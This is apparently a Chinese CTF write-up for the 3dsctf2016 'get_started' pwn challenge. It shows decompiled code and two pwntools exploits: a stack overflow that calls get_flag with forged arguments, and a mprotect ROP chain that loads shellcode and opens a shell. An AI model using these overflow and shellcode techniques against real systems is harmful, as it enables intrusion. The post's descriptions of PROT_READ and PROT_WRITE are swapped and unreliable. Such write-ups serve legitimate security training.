---
layout: post
title:  get_started
date:   2021-01-30 00:01:01 +0300
image:  2021-01-30-dandelion.jpg
tags:   [ctf,PWN,3dsctf2016]
---

主函数

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [esp+4h] [ebp-38h]

  printf("Qual a palavrinha magica? ", v4);
  gets(&v4);
  return 0;
}
```

get_flag()

```assembly
void __cdecl get_flag(int a1, int a2)
{
  int v2; // eax
  int v3; // esi
  unsigned __int8 v4; // al
  int v5; // ecx
  unsigned __int8 v6; // al

  if ( a1 == 814536271 && a2 == 425138641 )
  {
    v2 = fopen("flag.txt", "rt");
    v3 = v2;
    v4 = getc(v2);
    if ( v4 != 255 )
    {
      v5 = (char)v4;
      do
      {
        putchar(v5);
        v6 = getc(v3);
        v5 = (char)v6;
      }
      while ( v6 != 255 );
    }
    fclose(v3);
  }
}
```

我们想通过栈溢出，使得程序直接返回到if语句中的v2 = fopen("flag.txt", "rt");处。但是测试发现行不通。

又因为if判断中的两个变量就是get_flag()函数的参数，所以我们想到可以使栈溢出带参数。

```assembly
from pwn import *

io = remote("node3.buuoj.cn",27711)

flag = 0x080489A0
exi = 0x0804E6A0
# p1 = 0x308CD64F # 814536271
# p2 = 0x195719D1 # 425138641
p1 = 814536271
p2 = 425138641
payload = "a" * 0x38 + p32(flag) + p32(exi)
payload += p32(p1) + p32(p2)
io.sendline(payload)

io.interactive()
```

这里get_flag()函数的返回地址是不能乱写的，如果程序异常退出就不能回显flag。

所以我们使他返回到exit()函数。

后来查阅资料，发现还有一种万能解法。

```assembly
int mprotect(const void *start, size_t len, int prot);
```

mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

prot可以取以下几个值，并且可以用''\|''将几个属性合起来使用：

1）PROT_READ：表示内存段内的内容可写；

2）PROT_WRITE：表示内存段内的内容可读；

3）PROT_EXEC：表示内存段中的内容可执行；

4）PROT_NONE：表示内存段中的内容根本没法访问。

需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。
如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。

所以如果发现程序中有mprotect()函数，就可以试一下此方法。

```assembly
from pwn import *

io = remote('node3.buuoj.cn',27711)

mprotect = 0x0806EC80
buf = 0x80ea000
pop_3_ret = 0x0804f460
'''
.text:0804F460         pop     ebx
.text:0804F461         pop     esi
.text:0804F462         pop     ebp
.text:0804F463         retn
'''
read_addr = 0x0806E140
 
payload = 'a'*56 +p32(mprotect) + p32(pop_3_ret)
payload += p32(buf) + p32(0x1000) + p32(0x7)
payload += p32(read_addr) + p32(buf)
payload += p32(0) + p32(buf) + p32(0x100)
io.sendline(payload)
 
shellcode = asm(shellcraft.sh(),arch='i386',os='linux')
io.sendline(shellcode)

io.interactive()
```

